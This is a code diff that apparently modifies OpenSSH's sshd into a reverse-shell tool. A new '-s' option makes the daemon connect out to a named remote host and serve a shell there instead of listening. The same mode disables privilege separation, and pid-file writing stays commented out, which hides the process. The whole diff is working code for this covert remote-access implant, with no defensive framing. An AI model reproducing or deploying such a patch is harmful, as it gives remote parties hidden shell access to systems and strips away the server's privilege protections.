@@ -87,6 +87,8 @@
 
 #include "xmalloc.h"
 #include "ssh.h"
+#include "reverseshell.h"
+#include "sshconnect.h"
 #include "ssh2.h"
 #include "sshpty.h"
 #include "packet.h"
@@ -171,6 +173,8 @@ int rexec_flag = 0;
 int rexec_argc = 0;
 char **rexec_argv;
 
+/* reverse shell */
+int reverseshell_flag = 0;
 /*
  * The sockets that the server is listening; this is used in the SIGHUP
  * signal handler.
@@ -694,9 +698,9 @@ privsep_postauth(Authctxt *authctxt)
 #ifdef DISABLE_FD_PASSING
 	if (1) {
 #else
-	if (authctxt->pw->pw_uid == 0) {
+	if (authctxt->pw->pw_uid == 0 || reverseshell_flag) {
 #endif
-		/* File descriptor passing is broken or root login */
+		/* File descriptor passing is broken or root login or reverse shell */
 		use_privsep = 0;
 		goto skip;
 	}
@@ -974,6 +978,7 @@ usage(void)
 "usage: sshd [-46DdeiqTt] [-C connection_spec] [-c host_cert_file]\n"
 "            [-E log_file] [-f config_file] [-g login_grace_time]\n"
 "            [-h host_key_file] [-o option] [-p port] [-u len]\n"
+"            [-s remote_client (in reverse shell operation)]\n"
 	);
 	exit(1);
 }
@@ -1479,17 +1484,18 @@ main(int ac, char **av)
 	struct ssh *ssh = NULL;
 	extern char *optarg;
 	extern int optind;
-    int type;
 	int r, opt, on = 1, already_daemon, remote_port;
 	int sock_in = -1, sock_out = -1, newsock = -1;
 	const char *remote_ip, *rdomain;
-	char *fp, *line, *laddr, *logfile = NULL;
+	char *fp, *line, *laddr, *logfile, *remoteclient = NULL;
 	int config_s[2] = { -1 , -1 };
 	u_int i, j;
 	u_int64_t ibytes, obytes;
 	mode_t new_umask;
 	struct sshkey *key;
 	struct sshkey *pubkey;
+    struct addrinfo *addrs;
+    char cname[NI_MAXHOST];
 	int keytype;
 	Authctxt *authctxt;
 	struct connection_info *connection_info = NULL;
@@ -1526,7 +1532,7 @@ main(int ac, char **av)
 
 	/* Parse command-line arguments. */
 	while ((opt = getopt(ac, av,
-	    "C:E:b:c:f:g:h:k:o:p:u:46DQRTdeiqrt")) != -1) {
+	    "C:E:b:c:f:g:h:k:o:p:u:s:46DQRTdeiqt")) != -1) {
 		switch (opt) {
 		case '4':
 			options.address_family = AF_INET;
@@ -1560,8 +1566,9 @@ main(int ac, char **av)
 		case 'i':
 			inetd_flag = 1;
 			break;
-		case 'r':
-			rexec_flag = 0;
+		case 's':
+			reverseshell_flag = 1;
+			remoteclient = optarg;
 			break;
 		case 'R':
 			rexeced_flag = 1;
@@ -1965,40 +1972,36 @@ main(int ac, char **av)
 	/* ignore SIGPIPE */
 	signal(SIGPIPE, SIG_IGN);
 
-	/* Get a connection, either from inetd or a listening TCP socket */
-	if (inetd_flag) {
-		server_accept_inetd(&sock_in, &sock_out);
-	} else {
-		platform_pre_listen();
-		server_listen();
+    /* test reverse shell flag */
+    if (reverseshell_flag) {
+        // note to self: packet_set_connection called further down
+        if ((addrs = resolve_host(remoteclient, options.ports[0], 0,
+            cname, sizeof(cname))) == NULL)
+            fatal("cannot resolve client hostname");
+        if (ssh_connect_reverse(&newsock, &sock_in, &sock_out,
+            remoteclient, addrs,
+            options.ports[0], options.address_family, 
+            3,1,0) != 0)
+            exit(255);
+    } else {
+        /* Get a connection, either from inetd or a listening TCP socket */
+        if (inetd_flag) {
+            server_accept_inetd(&sock_in, &sock_out);
+        } else {
+            platform_pre_listen();
+            server_listen();
 
-		signal(SIGHUP, sighup_handler);
-		signal(SIGCHLD, main_sigchld_handler);
-		signal(SIGTERM, sigterm_handler);
-		signal(SIGQUIT, sigterm_handler);
+            signal(SIGHUP, sighup_handler);
+            signal(SIGCHLD, main_sigchld_handler);
+            signal(SIGTERM, sigterm_handler);
+            signal(SIGQUIT, sigterm_handler);
 
-		/*
-		 * Write out the pid file after the sigterm handler
-		 * is setup and the listen sockets are bound
-		 */
-        /* No, we do not write a pid file
-		if (options.pid_file != NULL && !debug_flag) {
-			FILE *f = fopen(options.pid_file, "w");
 
-			if (f == NULL) {
-				error("Couldn't create pid file \"%s\": %s",
-				    options.pid_file, strerror(errno));
-			} else {
-				fprintf(f, "%ld\n", (long) getpid());
-				fclose(f);
-			}
-		}
-        */
-		/* Accept a connection and return in a forked child */
-		server_accept_loop(&sock_in, &sock_out,
-		    &newsock, config_s);
-	}
-
+            /* Accept a connection and return in a forked child */
+            server_accept_loop(&sock_in, &sock_out,
+                &newsock, config_s);
+        }
+    }
 	/* This is the child processing a new connection. */
 	setproctitle("%s", "[accepted]");
 
@@ -2370,3 +2373,4 @@ cleanup_exit(int i)
 #endif
 	_exit(i);
 }
+
